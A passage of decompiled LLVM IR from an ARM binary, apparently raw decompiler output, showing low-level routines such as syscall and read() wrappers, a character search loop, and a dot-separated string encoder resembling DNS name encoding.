  store i32 %v0_14b50, i32* %r0.global-to-local, align 4
  %v0_14b54 = load i32, i32* @r8, align 4
  store i32 %v0_14b54, i32* %r1.global-to-local, align 4
  store i32 %stack_var_-52.0, i32* %r2.global-to-local, align 4
  %v3_14b5c = call i32 @function_e7bc(i32 %v0_14b50, i32 %v0_14b54, i32 %stack_var_-52.0)
  store i32 %v3_14b5c, i32* %r0.global-to-local, align 4
  %v2_14b60 = icmp eq i32 %v3_14b5c, 0
  br i1 %v2_14b60, label %dec_label_pc_14b68, label %dec_label_pc_14a10

dec_label_pc_14b68:                               ; preds = %dec_label_pc_14b50, %dec_label_pc_149a0, %dec_label_pc_1495c
  %v2_14b68 = load i32, i32* %stack_var_-64, align 4
  store i32 %v2_14b68, i32* %r3.global-to-local, align 4
  %v7_14b6c = icmp eq i32 %v2_14b68, 1
  br i1 %v7_14b6c, label %dec_label_pc_14b84, label %dec_label_pc_14b74

dec_label_pc_14b74:                               ; preds = %dec_label_pc_14b68
  store i32 %stack_var_-52.0, i32* %r0.global-to-local, align 4
  %v1_14b78 = inttoptr i32 %stack_var_-52.0 to i8*
  %v2_14b78 = call i32 @function_ced0(i8* %v1_14b78)
  store i32 %v2_14b78, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14b84

dec_label_pc_14b80:                               ; preds = %dec_label_pc_1489c, %bb74, %dec_label_pc_148f0, %dec_label_pc_148e8, %dec_label_pc_148dc, %dec_label_pc_148c8, %dec_label_pc_148ac
  store i32 34, i32* @sl, align 4
  br label %dec_label_pc_14b84

dec_label_pc_14b84:                               ; preds = %dec_label_pc_14aac, %dec_label_pc_14b68, %dec_label_pc_14b74, %dec_label_pc_14944, %dec_label_pc_14b80
  %v0_14b84 = load i32, i32* @sl, align 4
  store i32 %v0_14b84, i32* %r0.global-to-local, align 4
  store i32 %v3_1486c, i32* @r4, align 4
  store i32 %v6_1486c, i32* @r5, align 4
  store i32 %v12_1486c, i32* @r7, align 4
  store i32 %v15_1486c, i32* @r8, align 4
  store i32 %v21_1486c, i32* @sl, align 4
  store i32 %v24_1486c, i32* @fp, align 4
  ret i32 %v0_14b84

; uselistorder directives
  uselistorder i32 %v1_14adc, { 1, 0 }
  uselistorder i32 %v0_14aa0, { 1, 0 }
  uselistorder i32 %v3_14a3c23, { 1, 0 }
  uselistorder i32 %v0_14a3c20, { 1, 0 }
  uselistorder i32 %v2_14a18, { 1, 0, 2 }
  uselistorder i32 %stack_var_-52.0, { 1, 0, 3, 2 }
  uselistorder i32 %stack_var_-40.1, { 1, 0 }
  uselistorder i32 %v0_14918, { 1, 0 }
  uselistorder i32 %v0_148dc, { 1, 0, 2, 3 }
  uselistorder i32 %v0_148c0, { 1, 0 }
  uselistorder i32 %v0_1488c, { 1, 0, 2 }
  uselistorder i32 %v0_14880, { 0, 2, 1, 3 }
  uselistorder i32 %v1_1487c, { 4, 2, 3, 1, 0 }
  uselistorder i32 %tmp61, { 1, 0, 3, 2 }
  uselistorder i32 %tmp57, { 0, 2, 3, 1 }
  uselistorder i32 %tmp56, { 3, 0, 1, 2 }
  uselistorder i32 %tmp53, { 0, 4, 3, 2, 1 }
  uselistorder i32* %r3.global-to-local, { 0, 10, 16, 11, 12, 13, 14, 15, 24, 17, 18, 1, 2, 3, 4, 5, 6, 7, 8, 9, 19, 20, 21, 22, 23 }
  uselistorder i32* %r2.global-to-local, { 13, 3, 4, 8, 9, 18, 10, 19, 11, 12, 20, 0, 1, 2, 5, 6, 7, 14, 16, 15, 17 }
  uselistorder i32* %r1.global-to-local, { 11, 2, 5, 6, 7, 13, 8, 14, 9, 10, 0, 1, 3, 4, 12 }
  uselistorder i32* %r0.global-to-local, { 1, 6, 2, 23, 22, 12, 7, 14, 13, 15, 16, 19, 17, 18, 21, 20, 3, 4, 5, 8, 9, 10, 11, 24, 0, 25 }
  uselistorder i32* %ip.global-to-local, { 5, 0, 1, 2, 3, 4, 6 }
  uselistorder i32 34, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32 (i8*)* @function_ced0, { 5, 7, 3, 4, 0, 1, 2, 6, 8 }
  uselistorder i32 (i32, i32, i32)* @function_e7bc, { 4, 3, 0, 5, 2, 1 }
  uselistorder i32 (i8*, i32)* @function_f464, { 4, 5, 6, 0, 1, 2, 3 }
  uselistorder i32 (i8*, i32)* @function_f010, { 1, 3, 4, 2, 0 }
  uselistorder i32 7, { 2, 10, 11, 4, 5, 6, 0, 7, 14, 13, 1, 8, 9, 12, 3 }
  uselistorder i32* @global_var_205f0, { 0, 6, 2, 7, 1, 3, 4, 8, 5 }
  uselistorder i32 10, { 5, 6, 34, 7, 8, 35, 36, 37, 38, 39, 26, 14, 27, 13, 28, 29, 15, 30, 31, 40, 4, 41, 42, 43, 44, 12, 16, 46, 17, 47, 48, 18, 49, 19, 20, 0, 9, 10, 21, 24, 25, 3, 45, 50, 11, 1, 32, 22, 33, 2, 23 }
  uselistorder i32 80, { 0, 4, 5, 6, 1, 7, 2, 3 }
  uselistorder i32 48, { 9, 5, 6, 7, 8, 10, 2, 11, 12, 13, 3, 4, 14, 15, 16, 18, 17, 1, 0, 19 }
  uselistorder i32 36, { 4, 5, 6, 7, 8, 9, 10, 3, 1, 14, 2, 0, 11, 12, 13 }
  uselistorder i32 56, { 3, 5, 6, 2, 4, 7, 1, 0, 8, 9 }
  uselistorder i32 44, { 3, 4, 5, 7, 8, 11, 1, 2, 9, 6, 0, 10 }
  uselistorder i32 -48, { 2, 3, 0, 4, 5, 6, 7, 1 }
  uselistorder i32* @fp, { 27, 30, 28, 1, 29, 31, 32, 33, 34, 0, 36, 35, 37, 38, 39, 2, 40, 41, 42, 43, 44, 45, 46, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 3, 4, 5, 6, 7, 8, 9, 10, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 47, 48, 67, 68, 69, 70, 49, 50, 51, 64, 65, 66, 11, 12, 13 }
  uselistorder label %dec_label_pc_14b84, { 4, 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_14b80, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder label %dec_label_pc_14b50, { 3, 0, 1, 2, 4 }
  uselistorder label %dec_label_pc_14b4c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_14af0, { 1, 0 }
  uselistorder label %dec_label_pc_14a9c, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_14a3c.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_14a7c, { 1, 0 }
  uselistorder label %dec_label_pc_149f8, { 1, 0 }
  uselistorder label %bb74, { 1, 0 }
  uselistorder label %dec_label_pc_148ac, { 1, 0 }
}

define i32 @function_14b94(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_14b94:
  %r4.global-to-local = alloca i32, align 4
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_14bd8, label %dec_label_pc_14bc4

dec_label_pc_14bc4:                               ; preds = %dec_label_pc_14b94
  %v0_14bc4 = call i32 @function_cec4()
  %v0_14bc8 = load i32, i32* %r4.global-to-local, align 4
  %v1_14bc8 = sub i32 0, %v0_14bc8
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_14bd0 = inttoptr i32 %v0_14bc4 to i32*
  store i32 %v1_14bc8, i32* %v2_14bd0, align 4
  %v0_14be0.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14be0

dec_label_pc_14bd8:                               ; preds = %dec_label_pc_14b94
  %v2_14bd8 = icmp eq i32 %arg1, 0
  br i1 %v2_14bd8, label %dec_label_pc_14bec, label %dec_label_pc_14be0

dec_label_pc_14be0:                               ; preds = %dec_label_pc_14bd8, %dec_label_pc_14bc4
  %v0_14be0 = phi i32 [ %arg1, %dec_label_pc_14bd8 ], [ %v0_14be0.pre, %dec_label_pc_14bc4 ]
  br label %dec_label_pc_14bf0

dec_label_pc_14bec:                               ; preds = %dec_label_pc_14bd8
  br label %dec_label_pc_14bf0

dec_label_pc_14bf0:                               ; preds = %dec_label_pc_14be0, %dec_label_pc_14bec
  %v14_14bf4 = phi i32 [ %v0_14be0, %dec_label_pc_14be0 ], [ %tmp9, %dec_label_pc_14bec ]
  ret i32 %v14_14bf4

; uselistorder directives
  uselistorder i32 %arg1, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_14bf0, { 1, 0 }
}

define i32 @function_14bf8(i32 %arg1) local_unnamed_addr {
dec_label_pc_14bf8:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14bf8 = load i32, i32* @r4, align 4
  store i32 %v3_14bf8, i32* %stack_var_-8, align 4
  %v1_14bfc = load i32, i32* @r1, align 4
  %v2_14bfc = inttoptr i32 %v1_14bfc to i32*
  %v3_14bfc = load i32, i32* @r2, align 4
  %v4_14bfc = call i32 @read(i32 %arg1, i32* %v2_14bfc, i32 %v3_14bfc)
  store i32 %v4_14bfc, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v4_14bfc, -4095
  br i1 %tmp, label %dec_label_pc_14c1c, label %dec_label_pc_14c0c

dec_label_pc_14c0c:                               ; preds = %dec_label_pc_14bf8
  %v0_14c0c = call i32 @function_cec4()
  %v0_14c10 = load i32, i32* %r4.global-to-local, align 4
  %v1_14c10 = sub i32 0, %v0_14c10
  %v2_14c14 = inttoptr i32 %v0_14c0c to i32*
  store i32 %v1_14c10, i32* %v2_14c14, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14c1c

dec_label_pc_14c1c:                               ; preds = %dec_label_pc_14bf8, %dec_label_pc_14c0c
  %v0_14c1c = phi i32 [ %v4_14bfc, %dec_label_pc_14bf8 ], [ -1, %dec_label_pc_14c0c ]
  %v2_14c20 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_14c20, i32* @r4, align 4
  ret i32 %v0_14c1c

; uselistorder directives
  uselistorder i32 %v4_14bfc, { 1, 0, 2 }
  uselistorder i32 ()* @function_cec4, { 24, 38, 46, 71, 70, 69, 45, 23, 37, 36, 20, 61, 22, 19, 44, 35, 34, 60, 11, 10, 59, 9, 53, 8, 7, 6, 5, 58, 57, 4, 3, 2, 72, 52, 51, 50, 49, 68, 67, 18, 33, 66, 48, 32, 31, 43, 30, 29, 42, 28, 27, 16, 0, 17, 12, 56, 55, 54, 21, 47, 26, 14, 1, 41, 13, 40, 39, 25, 15, 65, 64, 63, 62 }
  uselistorder label %dec_label_pc_14c1c, { 1, 0 }
}

define i32 @function_14c24(i32 %arg1) local_unnamed_addr {
dec_label_pc_14c24:
  %v1_14c2c = icmp slt i32 %arg1, 0
  br i1 %v1_14c2c, label %bb, label %bb1

bb:                                               ; preds = %dec_label_pc_14c24
  ret i32 %arg1

bb1:                                              ; preds = %dec_label_pc_14c24
  %v2_14c2c = mul i32 %arg1, 2
  %v2_14c38 = load i32, i32* bitcast (i32** @global_var_205f8.419 to i32*), align 4
  %v2_14c3c = add i32 %v2_14c38, %v2_14c2c
  %v3_14c40 = inttoptr i32 %v2_14c3c to i8*
  %v4_14c40 = load i8, i8* %v3_14c40, align 1
  %v6_14c40 = zext i8 %v4_14c40 to i32
  %v1_14c44 = add i32 %v2_14c3c, 1
  %v2_14c44 = inttoptr i32 %v1_14c44 to i8*
  %v3_14c44 = load i8, i8* %v2_14c44, align 1
  %v4_14c44 = zext i8 %v3_14c44 to i32
  %v3_14c48 = mul nuw i32 %v4_14c44, 16777216
  %v4_14c4c = sdiv i32 %v3_14c48, 65536
  %v5_14c4c = or i32 %v4_14c4c, %v6_14c40
  ret i32 %v5_14c4c

; uselistorder directives
  uselistorder i32 %v2_14c3c, { 1, 0 }
}

define i32 @function_14c58(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_14c58:
  %v6_14c58 = load i32, i32* @r5, align 4
  %v9_14c58 = load i32, i32* @r6, align 4
  %v1_14c5c = urem i32 %arg1, 256
  br label %dec_label_pc_14c7c

dec_label_pc_14c64:                               ; preds = %dec_label_pc_14c7c
  %v3_14c64 = load i8, i8* %.0, align 1
  %v4_14c64 = zext i8 %v3_14c64 to i32
  %v9_14c68 = icmp eq i32 %v4_14c64, %v1_14c5c
  br i1 %v9_14c68, label %bb, label %bb24

bb:                                               ; preds = %dec_label_pc_14c64
  ret i32 %v1_14c7c

bb24:                                             ; preds = %dec_label_pc_14c64
  %v2_14c70 = icmp eq i8 %v3_14c64, 0
  %v2_14c74 = add i32 %v1_14c7c, 1
  %v3_14c74 = inttoptr i32 %v2_14c74 to i8*
  br i1 %v2_14c70, label %dec_label_pc_14d50, label %dec_label_pc_14c7c

dec_label_pc_14c7c:                               ; preds = %bb24, %dec_label_pc_14c58
  %.0 = phi i8* [ undef, %dec_label_pc_14c58 ], [ %v3_14c74, %bb24 ]
  %v1_14c7c = ptrtoint i8* %.0 to i32
  %v2_14c7c = urem i32 %v1_14c7c, 4
  %v3_14c7c = icmp eq i32 %v2_14c7c, 0
  br i1 %v3_14c7c, label %dec_label_pc_14c84, label %dec_label_pc_14c64

dec_label_pc_14c84:                               ; preds = %dec_label_pc_14c7c
  %v4_14c84 = mul nuw nsw i32 %v1_14c5c, 256
  %v5_14c84 = or i32 %v4_14c84, %v1_14c5c
  %v4_14c8c = mul i32 %v5_14c84, 65536
  %v5_14c8c = or i32 %v4_14c8c, %v5_14c84
  br label %dec_label_pc_14c90

dec_label_pc_14c90:                               ; preds = %dec_label_pc_14d48, %dec_label_pc_14cd0, %dec_label_pc_14c84
  %v0_14cf4 = phi i32 [ %v1_14c7c, %dec_label_pc_14c84 ], [ %v4_14c90, %dec_label_pc_14cd0 ], [ %v4_14c90, %dec_label_pc_14d48 ]
  %v1_14c90 = inttoptr i32 %v0_14cf4 to i32*
  %v2_14c90 = load i32, i32* %v1_14c90, align 4
  %v4_14c90 = add i32 %v0_14cf4, 4
  %v2_14c98 = xor i32 %v2_14c90, %v5_14c8c
  %v2_14ca4 = add i32 %v2_14c90, 2130640639
  %v1_14ca8 = sub i32 -1, %v2_14c90
  %v2_14cac = xor i32 %v2_14ca4, %v1_14ca8
  %v2_14cb0 = add i32 %v2_14c98, 2130640639
  %v1_14cb8 = sub i32 -1, %v2_14c98
  %v2_14cbc = and i32 %v2_14cac, -2130640640
  %v2_14cc0 = xor i32 %v2_14cb0, %v1_14cb8
  %v2_14cc4 = icmp eq i32 %v2_14cbc, 0
  %v2_14cc8 = and i32 %v2_14cc0, -2130640640
  store i32 %v2_14cc8, i32* @lr, align 4
  br i1 %v2_14cc4, label %dec_label_pc_14cd0, label %dec_label_pc_14cd8

dec_label_pc_14cd0:                               ; preds = %dec_label_pc_14c90
  %v2_14cd0 = icmp eq i32 %v2_14cc8, 0
  br i1 %v2_14cd0, label %dec_label_pc_14c90, label %dec_label_pc_14cd8

dec_label_pc_14cd8:                               ; preds = %dec_label_pc_14c90, %dec_label_pc_14cd0
  %v2_14cd8 = inttoptr i32 %v0_14cf4 to i8*
  %v3_14cd8 = load i8, i8* %v2_14cd8, align 1
  %v4_14cd8 = zext i8 %v3_14cd8 to i32
  %v1_14ce0 = add i32 %v0_14cf4, 1
  %v1_14ce4 = add i32 %v0_14cf4, 2
  %v9_14ce8 = icmp eq i32 %v4_14cd8, %v1_14c5c
  %v1_14cec = add i32 %v0_14cf4, 3
  br i1 %v9_14ce8, label %dec_label_pc_14cf4, label %dec_label_pc_14cfc

dec_label_pc_14cf4:                               ; preds = %dec_label_pc_14cd8
  store i32 %v6_14c58, i32* @r5, align 4
  store i32 %v9_14c58, i32* @r6, align 4
  ret i32 %v0_14cf4

dec_label_pc_14cfc:                               ; preds = %dec_label_pc_14cd8
  %v2_14cfc = icmp eq i8 %v3_14cd8, 0
  br i1 %v2_14cfc, label %dec_label_pc_14d50, label %dec_label_pc_14d04

dec_label_pc_14d04:                               ; preds = %dec_label_pc_14cfc
  %v2_14d04 = inttoptr i32 %v1_14ce0 to i8*
  %v3_14d04 = load i8, i8* %v2_14d04, align 1
  %v4_14d04 = zext i8 %v3_14d04 to i32
  %v9_14d08 = icmp eq i32 %v4_14d04, %v1_14c5c
  br i1 %v9_14d08, label %bb25, label %bb26

bb25:                                             ; preds = %dec_label_pc_14d04
  store i32 %v6_14c58, i32* @r5, align 4
  store i32 %v9_14c58, i32* @r6, align 4
  ret i32 %v1_14ce0

bb26:                                             ; preds = %dec_label_pc_14d04
  %v2_14d10 = icmp eq i8 %v3_14d04, 0
  br i1 %v2_14d10, label %dec_label_pc_14d50, label %dec_label_pc_14d18

dec_label_pc_14d18:                               ; preds = %bb26
  %v2_14d18 = inttoptr i32 %v1_14ce4 to i8*
  %v3_14d18 = load i8, i8* %v2_14d18, align 1
  %v4_14d18 = zext i8 %v3_14d18 to i32
  %v9_14d1c = icmp eq i32 %v4_14d18, %v1_14c5c
  br i1 %v9_14d1c, label %dec_label_pc_14d24, label %dec_label_pc_14d2c

dec_label_pc_14d24:                               ; preds = %dec_label_pc_14d18
  store i32 %v6_14c58, i32* @r5, align 4
  store i32 %v9_14c58, i32* @r6, align 4
  ret i32 %v1_14ce4

dec_label_pc_14d2c:                               ; preds = %dec_label_pc_14d18
  %v2_14d2c = icmp eq i8 %v3_14d18, 0
  br i1 %v2_14d2c, label %dec_label_pc_14d50, label %dec_label_pc_14d34

dec_label_pc_14d34:                               ; preds = %dec_label_pc_14d2c
  %v2_14d34 = inttoptr i32 %v1_14cec to i8*
  %v3_14d34 = load i8, i8* %v2_14d34, align 1
  %v4_14d34 = zext i8 %v3_14d34 to i32
  %v9_14d38 = icmp eq i32 %v4_14d34, %v1_14c5c
  br i1 %v9_14d38, label %dec_label_pc_14d40, label %dec_label_pc_14d48

dec_label_pc_14d40:                               ; preds = %dec_label_pc_14d34
  store i32 %v6_14c58, i32* @r5, align 4
  store i32 %v9_14c58, i32* @r6, align 4
  ret i32 %v1_14cec

dec_label_pc_14d48:                               ; preds = %dec_label_pc_14d34
  %v2_14d48 = icmp eq i8 %v3_14d34, 0
  br i1 %v2_14d48, label %dec_label_pc_14d50, label %dec_label_pc_14c90

dec_label_pc_14d50:                               ; preds = %bb24, %dec_label_pc_14d48, %dec_label_pc_14d2c, %bb26, %dec_label_pc_14cfc
  store i32 %v6_14c58, i32* @r5, align 4
  store i32 %v9_14c58, i32* @r6, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_14c90, { 1, 0 }
  uselistorder i32 %v2_14c90, { 0, 2, 1 }
  uselistorder i32 %v0_14cf4, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v5_14c84, { 1, 0 }
  uselistorder i32 %v1_14c7c, { 1, 0, 2, 3 }
  uselistorder i8* %.0, { 1, 0 }
  uselistorder i32 %v1_14c5c, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder i32 %v9_14c58, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v6_14c58, { 3, 0, 1, 2, 4 }
  uselistorder i32 -2130640640, { 2, 5, 6, 7, 3, 0, 8, 4, 1 }
  uselistorder i32 2130640639, { 1, 2, 5, 6, 3, 0, 4 }
  uselistorder i8* undef, { 2, 1, 0 }
  uselistorder label %dec_label_pc_14d50, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_14cd8, { 1, 0 }
}

define i32 @function_14d60(i8* %arg1) local_unnamed_addr {
dec_label_pc_14d60:
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_14d60 = load i32, i32* @r4, align 4
  store i32 %v3_14d60, i32* %stack_var_-24, align 4
  %v6_14d60 = load i32, i32* @r5, align 4
  %v9_14d60 = load i32, i32* @r6, align 4
  store i32 %tmp, i32* @r4, align 4
  %v0_14d68 = load i32, i32* @r1, align 4
  store i32 %v0_14d68, i32* @r6, align 4
  %v0_14d6c = load i32, i32* @r2, align 4
  store i32 %v0_14d6c, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  store i32 %tmp, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_14dd419 = icmp slt i8* %arg1, null
  store i1 %v1_14dd419, i1* %cpsr_n.global-to-local, align 1
  %v2_14dd420 = icmp eq i8* %arg1, null
  store i1 %v2_14dd420, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14dd420, label %dec_label_pc_14dec, label %dec_label_pc_14de0

dec_label_pc_14d78:                               ; preds = %dec_label_pc_14de0
  %v2_14d78 = call i32 @function_14c58(i32 %v0_14d7821, i32 46)
  store i32 %v2_14d78, i32* @r5, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_14d7c = icmp slt i32 %v2_14d78, 0
  store i1 %v1_14d7c, i1* %cpsr_n.global-to-local, align 1
  %v2_14d7c = icmp eq i32 %v2_14d78, 0
  store i1 %v2_14d7c, i1* %cpsr_z.global-to-local, align 1
  %v0_14d80 = load i32, i32* @r4, align 4
  %v2_14d80 = sub i32 %v2_14d78, %v0_14d80
  store i32 %v2_14d80, i32* %ip.global-to-local, align 4
  store i32 %v0_14d80, i32* @r0, align 4
  br i1 %v2_14d7c, label %dec_label_pc_14d8c, label %dec_label_pc_14d94

dec_label_pc_14d8c:                               ; preds = %dec_label_pc_14d78
  %v0_14d8c = call i32 @function_f030()
  store i32 %v0_14d8c, i32* %r0.global-to-local, align 4
  %sext = mul i32 %v0_14d8c, 16777216
  %v1_14d90 = sdiv i32 %sext, 16777216
  store i32 %v1_14d90, i32* %ip.global-to-local, align 4
  %v0_14da0.pre = load i32, i32* @r4, align 4
  %v0_14db0.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_14d94

dec_label_pc_14d94:                               ; preds = %dec_label_pc_14d78, %dec_label_pc_14d8c
  %v0_14db0 = phi i32 [ %v2_14d78, %dec_label_pc_14d78 ], [ %v0_14db0.pre, %dec_label_pc_14d8c ]
  %v0_14da0 = phi i32 [ %v0_14d80, %dec_label_pc_14d78 ], [ %v0_14da0.pre, %dec_label_pc_14d8c ]
  %v0_14dc0 = phi i32 [ %v2_14d80, %dec_label_pc_14d78 ], [ %v1_14d90, %dec_label_pc_14d8c ]
  %v0_14d94 = load i32, i32* %r7.global-to-local, align 4
  %v1_14d94 = add i32 %v0_14d94, 1
  store i32 %v1_14d94, i32* @lr, align 4
  %v1_14d98 = load i32, i32* %r8.global-to-local, align 4
  %v2_14d98 = sub i32 %v1_14d98, %v0_14d94
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_14d9c = icmp slt i32 %v0_14dc0, 0
  store i1 %v1_14d9c, i1* %cpsr_n.global-to-local, align 1
  %v2_14d9c = icmp eq i32 %v0_14dc0, 0
  store i1 %v2_14d9c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_14da0, i32* @r1, align 4
  %v0_14da4 = load i32, i32* @r6, align 4
  %v2_14da4 = add i32 %v0_14da4, %v1_14d94
  store i32 %v2_14da4, i32* @r0, align 4
  store i32 %v0_14dc0, i32* @r2, align 4
  %v1_14dac = add i32 %v2_14d98, -1
  %v1_14db0 = add i32 %v0_14db0, 1
  store i32 %v1_14db0, i32* @r4, align 4
  br i1 %v2_14d9c, label %.loopexit, label %dec_label_pc_14db8

dec_label_pc_14db8:                               ; preds = %dec_label_pc_14d94
  %v2_14db8 = sub i32 %v0_14dc0, %v1_14dac
  %v3_14db8 = icmp ult i32 %v0_14dc0, %v1_14dac
  %v4_14db8 = xor i32 %v1_14dac, %v0_14dc0
  %v5_14db8 = xor i32 %v2_14db8, %v0_14dc0
  %v6_14db8 = and i32 %v5_14db8, %v4_14db8
  %v7_14db8 = icmp slt i32 %v6_14db8, 0
  store i1 %v7_14db8, i1* %cpsr_v.global-to-local, align 1
  %v8_14db8 = icmp slt i32 %v2_14db8, 0
  store i1 %v8_14db8, i1* %cpsr_n.global-to-local, align 1
  %v9_14db8 = icmp eq i32 %v0_14dc0, %v1_14dac
  store i1 %v9_14db8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_14db8, label %dec_label_pc_14dc0, label %.loopexit

dec_label_pc_14dc0:                               ; preds = %dec_label_pc_14db8
  %v1_14dc0 = trunc i32 %v0_14dc0 to i8
  %v4_14dc0 = add i32 %v0_14da4, %v0_14d94
  %v5_14dc0 = inttoptr i32 %v4_14dc0 to i8*
  store i8 %v1_14dc0, i8* %v5_14dc0, align 1
  %v0_14dc4 = load i32, i32* @lr, align 4
  %v1_14dc4 = load i32, i32* %ip.global-to-local, align 4
  %v2_14dc4 = add i32 %v1_14dc4, %v0_14dc4
  store i32 %v2_14dc4, i32* %r7.global-to-local, align 4
  %v0_14dc8 = call i32 @function_ef60()
  store i32 %v0_14dc8, i32* %r0.global-to-local, align 4
  %v0_14dcc = load i32, i32* @r5, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_14dcc = icmp slt i32 %v0_14dcc, 0
  store i1 %v1_14dcc, i1* %cpsr_n.global-to-local, align 1
  %v2_14dcc = icmp eq i32 %v0_14dcc, 0
  store i1 %v2_14dcc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14dcc, label %dec_label_pc_14dec, label %dec_label_pc_14dc0.dec_label_pc_14dd4_crit_edge

dec_label_pc_14dc0.dec_label_pc_14dd4_crit_edge:  ; preds = %dec_label_pc_14dc0
  %v0_14dd4.pre = load i32, i32* @r4, align 4
  store i32 %v0_14dd4.pre, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_14dd4 = icmp slt i32 %v0_14dd4.pre, 0
  store i1 %v1_14dd4, i1* %cpsr_n.global-to-local, align 1
  %v2_14dd4 = icmp eq i32 %v0_14dd4.pre, 0
  store i1 %v2_14dd4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14dd4, label %dec_label_pc_14dec, label %dec_label_pc_14de0

dec_label_pc_14de0:                               ; preds = %dec_label_pc_14d60, %dec_label_pc_14dc0.dec_label_pc_14dd4_crit_edge
  %v0_14d7821 = phi i32 [ %v0_14dd4.pre, %dec_label_pc_14dc0.dec_label_pc_14dd4_crit_edge ], [ %tmp, %dec_label_pc_14d60 ]
  %v1_14de0 = inttoptr i32 %v0_14d7821 to i8*
  %v2_14de0 = load i8, i8* %v1_14de0, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_14de4 = icmp eq i8 %v2_14de0, 0
  store i1 %v2_14de4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14de4, label %dec_label_pc_14dec, label %dec_label_pc_14d78

dec_label_pc_14dec:                               ; preds = %dec_label_pc_14dc0.dec_label_pc_14dd4_crit_edge, %dec_label_pc_14dc0, %dec_label_pc_14de0, %dec_label_pc_14d60
  %v0_14dec = load i32, i32* %r8.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_14dec = icmp slt i32 %v0_14dec, 0
  store i1 %v1_14dec, i1* %cpsr_n.global-to-local, align 1
  %v2_14dec = icmp eq i32 %v0_14dec, 0
  store i1 %v2_14dec, i1* %cpsr_z.global-to-local, align 1
  %tmp16 = icmp slt i32 %v0_14dec, 1
  br i1 %tmp16, label %bb17, label %bb

bb:                                               ; preds = %dec_label_pc_14dec
  %v5_14df4 = load i32, i32* %r7.global-to-local, align 4
  %v6_14df4 = add i32 %v5_14df4, 1
  store i32 %v6_14df4, i32* %r0.global-to-local, align 4
  %v7_14df8 = load i32, i32* @r6, align 4
  %v9_14df8 = add i32 %v7_14df8, %v5_14df4
  %v10_14df8 = inttoptr i32 %v9_14df8 to i8*
  store i8 0, i8* %v10_14df8, align 1
  %v0_14dfc.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_14dfc.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_14dfc.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %bb17

bb17:                                             ; preds = %dec_label_pc_14dec, %bb
  %v2_14dfc = phi i1 [ %v2_14dfc.pre, %bb ], [ false, %dec_label_pc_14dec ]
  %v1_14dfc = phi i1 [ %v1_14dfc.pre, %bb ], [ %v1_14dec, %dec_label_pc_14dec ]
  %v0_14dfc = phi i1 [ %v0_14dfc.pre, %bb ], [ %v2_14dec, %dec_label_pc_14dec ]
  %v3_14dfc = xor i1 %v2_14dfc, %v1_14dfc
  %v4_14dfc = or i1 %v0_14dfc, %v3_14dfc
  br i1 %v4_14dfc, label %.loopexit, label %bb18

bb18:                                             ; preds = %bb17
  %v7_14dfc = load i32, i32* %stack_var_-24, align 4
  store i32 %v7_14dfc, i32* @r4, align 4
  store i32 %v6_14d60, i32* @r5, align 4
  store i32 %v9_14d60, i32* @r6, align 4
  %v25_14dfc = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v25_14dfc

.loopexit:                                        ; preds = %dec_label_pc_14db8, %dec_label_pc_14d94, %bb17
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_14e04 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_14e04, i32* @r4, align 4
  store i32 %v6_14d60, i32* @r5, align 4
  store i32 %v9_14d60, i32* @r6, align 4
